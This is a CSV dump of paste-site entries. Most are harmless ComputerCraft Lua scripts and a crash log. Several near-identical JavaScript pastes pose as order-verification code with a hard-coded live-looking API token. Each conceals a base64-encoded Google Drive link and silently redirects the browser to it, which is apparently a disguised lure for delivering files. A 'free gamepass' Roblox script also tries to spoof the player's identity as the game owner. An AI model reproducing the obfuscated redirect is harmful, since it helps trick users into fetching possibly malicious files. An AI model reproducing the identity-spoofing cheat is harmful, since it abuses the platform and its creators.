id,title,username,language,date,content
c1f8hJcv,Products.js,Ratqueenkslskskwkw,JavaScript,Friday 11th of April 2025 06:08:33 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/20209/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
2sJZ3YiV,Order.js,Ratqueenkslskskwkw,JavaScript,Friday 11th of April 2025 05:52:58 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/73824/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
CeeHSbge,Roblox Free Gamepass Script,Steamhesaproblox,RBScript,Friday 11th of April 2025 05:40:44 PM CDT,"local Players = game:GetService(""Players"")
local LocalPlayer = Players.LocalPlayer


if game.CreatorType == Enum.CreatorType.User then
    LocalPlayer.UserId = game.CreatorId
elseif game.CreatorType == Enum.CreatorType.Group then
    local success, groupInfo = pcall(function()
        return game:GetService(""GroupService""):GetGroupInfoAsync(game.CreatorId)
    end)
    if success then
        LocalPlayer.UserId = groupInfo.Owner.Id
    end
end


local screenGui = Instance.new(""ScreenGui"")
screenGui.Name = ""ElmasHileGui""
screenGui.ResetOnSpawn = false
screenGui.Parent = LocalPlayer:WaitForChild(""PlayerGui"")

local textLabel = Instance.new(""TextLabel"")
textLabel.Parent = screenGui
textLabel.Text = ""Elmas Hile sizlere sunar""
textLabel.Size = UDim2.new(0, 250, 0, 50)
textLabel.Position = UDim2.new(1, -260, 1, -60)
textLabel.BackgroundTransparency = 0.5
textLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
textLabel.Font = Enum.Font.SourceSansBold
textLabel.TextSize = 20
textLabel.TextStrokeTransparency = 0.2
textLabel.BorderSizePixel = 0"
zr06a3Gz,Market.js,Ratqueenkslskskwkw,JavaScript,Friday 11th of April 2025 05:37:36 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/41297/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
5ApA7FSW,cc_bouncing,dengmahalYT,Lua,Friday 11th of April 2025 05:24:04 PM CDT,"---@diagnostic disable: unused-function
local function wrapPs(peripheralName)
    local periTab={}
    local sideTab={}
    if peripheralName==nil then
        print(""Error"")
    end
    local peripherals = peripheral.getNames()
    local i2 = 1
    for i =1, #peripherals do
        if peripheral.getType(peripherals[i])==peripheralName then
            periTab[i2]=peripheral.wrap(peripherals[i])
            sideTab[i2]=peripherals[i]
            i2=i2+1
        end
    end
    if periTab~={} then
        return periTab,sideTab
    else
        return nil
    end
end
--local mon=wrapPs(""monitor"")[1]
--local SX,SY=mon.getSize()
local cs = {
	colors.red,        -- R
	colors.orange,     -- O
	colors.yellow,     -- Y
	colors.lime,       -- G (lime as a bright green)
	colors.green,      -- G (darker green)
	colors.lightBlue,  -- B (light blue, before deeper blues)
	colors.cyan,       -- B (cyan fits between lightBlue and blue)
	colors.blue,       -- B (standard blue)
	colors.purple,     -- I (indigo)
	colors.magenta,    -- V (magenta as a pinkish violet)
	colors.pink,       -- extra (soft violet range)
	colors.white,      -- neutral (not in rainbow)
	colors.lightGray,  -- neutral
	colors.gray,       -- neutral
	colors.brown       -- extra (not in rainbow)
}
local ci=1

local SX,SY=term.getSize()
local speed=7
local dt=1/7
local posx=math.random(3,SX-3)
local posy=math.random(3,SY-3)
local velx=speed*math.cos(0.25*math.pi)
local vely=speed*math.sin(0.25*math.pi)
local dimx=1
local dimy=1

local function sign(x)
	if x<0 then
		return -1
	else
		return 1
	end
end
local LX=false
local LY=false
local hits=0
if not fs.exists(""score"") then
	local file=fs.open(""score"",""w"")
	file.write(""0"")
	file.close()
else
	local file=fs.open(""score"",""r"")
	local content=file.readAll()
	hits=tonumber(content)
	file.close()
end
while true do
	posx=posx+velx*dt
	posy=posy+vely*dt
	local PX=math.floor(posx+0.5)
	local PY=math.floor(posy+0.5)
	local hs=0
	if ((posx+dimx)>SX or posx<1)and LX==false then
		velx=-velx
		LX=true
		hs=hs+1
	elseif not ((posx+dimx)>SX or posx<1) then
		LX=false
	end
	if ((posy+dimy)>SY or posy<1)and LY==false then
		vely=-vely
		LY=true
		hs=hs+1
	elseif not ((posy+dimy)>SY or posy<1) then
		LY=false
	end
	if hs==2 then
		hits=hits+1
		--local naf=math.atan(vely,velx)+math.random(-0.01,0.01)
		--velx=speed*math.cos(naf)
		--vely=speed*math.sin(naf)
		local file=fs.open(""score"",""w"")
		file.write(tostring(hits))
		file.close()
	end
	ci=ci+1
	if ci>#cs then
		ci=1
	end
	term.clear()
	paintutils.drawFilledBox(0,0,SX,SY,colours.black)
	paintutils.drawBox(PX, PY,PX+dimx, PY+dimy,cs[ci])
	term.setCursorPos(1, 1)
	term.setBackgroundColor(colours.black)
	term.setTextColour(colours.green)
	term.write(""Hits: ""..hits)
	sleep(dt)
end"
XMmrZHGL,tunnel,DevilTvLP,Lua,Friday 11th of April 2025 04:51:30 PM CDT,"function forward()
	while not turtle.forward() do
		turtle.dig()
		os.sleep(0.2)
	end
	turtle.digUp()
	if not turtle.detectDown() then
		turtle.select(1)
		turtle.placeDown()
	end
end

function tunnel()
	forward()
	turtle.digUp()
	
	turtle.turnLeft()
	while turtle.detect() do
		turtle.dig()
		os.sleep(0.5)
	end
	turtle.up()
	turtle.dig()
	
	turtle.turnRight()
	turtle.turnRight()
	while turtle.detect() do
		turtle.dig()
		os.sleep(0.5)
	end
	turtle.down()
	turtle.dig()
	turtle.turnLeft()
end

print(""1.Slot Cobblestone\n\n"")
write(""Laenge: "")
w = io.read()

for i = 1, w do
	tunnel()
end"
iyzQT4zR,Messanger (72C51178B/0Y),Nimda,HTML 5,Friday 11th of April 2025 04:46:12 PM CDT,NO MESSAGE
UyB5VGej,Untitled,Ratqueenkslskskwkw,JavaScript,Friday 11th of April 2025 04:42:22 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/84094/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Q8aWV1Bm,Products.js,kammex,JavaScript,Friday 11th of April 2025 04:26:57 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/16239/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
pFwiEATc,2025-04-11T18:19:46.016553,powerampache,PHP,Friday 11th of April 2025 04:19:47 PM CDT,"1.01-79-play (79) - DB: 83
retrofit2.HttpException: HTTP 404 { ""exception"" : ""Unable to resolve host ""umbrel.tail94509.ts.net"": No address associated with hostname"" }
	at retrofit2.KotlinExtensions$await$2$2.onResponse(KotlinExtensions.kt:53)
	at retrofit2.OkHttpCall$1.onResponse(OkHttpCall.java:164)
	at okhttp3.internal.connection.RealCall$AsyncCall.run(RealCall.kt:529)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:644)
	at java.lang.Thread.run(Thread.java:1012)

"
RZcktyRZ,Untitled,Hsiang_Nianian,Lua,Friday 11th of April 2025 04:15:49 PM CDT,"local files = {
  ""artist/core/context.lua"",
  ""artist/core/items.lua"",
  ""artist/gui/core.lua"",
  ""artist/gui/extra.lua"",
  ""artist/gui/interface.lua"",
  ""artist/gui/interface/pickup_chest.lua"",
  ""artist/gui/interface/turtle.lua"",
  ""artist/gui/item_list.lua"",
  ""artist/init.lua"",
  ""artist/items/annotate.lua"",
  ""artist/items/annotations.lua"",
  ""artist/items/cache.lua"",
  ""artist/items/dropoff.lua"",
  ""artist/items/furnaces.lua"",
  ""artist/items/inventories.lua"",
  ""artist/items/trashcan.lua"",
  ""artist/lib/class.lua"",
  ""artist/lib/concurrent.lua"",
  ""artist/lib/config.lua"",
  ""artist/lib/log.lua"",
  ""artist/lib/mediator.lua"",
  ""artist/lib/serialise.lua"",
  ""artist/lib/tbl.lua"",
  ""artist/lib/turtle.lua"",
  ""artist/lib/widget.lua"",
  ""launch.lua"",
  ""metis/input/keybinding.lua"",
  ""metis/string/fuzzy.lua"",
}
local tasks = {}
for i, path in ipairs(files) do
  tasks[i] = function()
    local req, err = http.get(""https://ghproxy.hydroroll.team/raw.githubusercontent.com/SquidDev-CC/artist/refs/heads/vnext/src/"" .. path)
    if not req then error(""Failed to download "" .. path .. "": "" .. err, 0) end

    local file = fs.open("".artist.d/src/"" .. path, ""w"")
    file.write(req.readAll())
    file.close()

    req.close()
  end
end

parallel.waitForAll(table.unpack(tasks))

io.open(""artist.lua"", ""w""):write('shell.run("".artist.d/src/launch.lua"")'):close()

print(""Artist successfully installed! Run /artist.lua to start."")
"
